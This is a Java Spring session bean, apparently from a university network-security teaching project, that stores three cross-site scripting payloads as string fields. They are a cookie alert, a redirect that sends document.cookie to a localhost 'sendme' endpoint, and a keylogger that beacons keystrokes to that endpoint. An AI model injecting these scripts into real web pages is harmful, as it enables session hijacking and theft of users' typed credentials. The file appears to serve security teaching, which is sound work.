package uk.ac.cardiff.nsa.security.model;


import org.springframework.stereotype.Component;
import org.springframework.web.context.annotation.SessionScope;

import javax.faces.bean.ManagedBean;
import javax.faces.bean.SessionScoped;

import java.util.List;
import java.util.Map;

/**
 * Created by philsmart on 03/02/2017.
 */
//@ManagedBean(name="accountInfo")
//@SessionScoped
@Component
@SessionScope
public class AccountInfo {

    private String username;

    private String script ="<script>function myFunction() {alert(document.cookie);}myFunction();</script>";

    private String listCookiesScript="<script>window.location='http://localhost:8080/sendme?cookie='+document.cookie</script>";

    private String javaScriptKeyLogger="<script>var buffer = []; var attacker = 'http://localhost:8080/sendme?cookie='\n" +
            "\n" +
            "document.onkeypress = function(e) {\n" +
            "    var timestamp = Date.now() | 0;\n" +
            "    var stroke = {\n" +
            "        k: e.key,\n" +
            "        t: timestamp\n" +
            "    };\n" +
            "    buffer.push(stroke);\n" +
            "}\n" +
            "\n" +
            "window.setInterval(function() {\n" +
            "    if (buffer.length > 0) {\n" +
            "        var data = encodeURIComponent(JSON.stringify(buffer));\n" +
            "        new Image().src = attacker + data;\n" +
            "        buffer = [];\n" +
            "    }\n" +
            "}, 200);</script>";

    public AccountInfo(){

    }

    /**
     * Store information about the account releating to the username {@code username}.
     */
    private List<Map<String,Object>> accountInformation;


    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public List<Map<String, Object>> getAccountInformation() {
        return accountInformation;
    }

    public void setAccountInformation(List<Map<String, Object>> accountInformation) {
        this.accountInformation = accountInformation;
    }

    public String getScript() {
        return script;
    }

    public void setScript(String script) {
        this.script = script;
    }

    public String getListCookiesScript() {
        return listCookiesScript;
    }

    public void setListCookiesScript(String listCookiesScript) {
        this.listCookiesScript = listCookiesScript;
    }

    public String getJavaScriptKeyLogger() {
        return javaScriptKeyLogger;
    }

    public void setJavaScriptKeyLogger(String javaScriptKeyLogger) {
        this.javaScriptKeyLogger = javaScriptKeyLogger;
    }
}
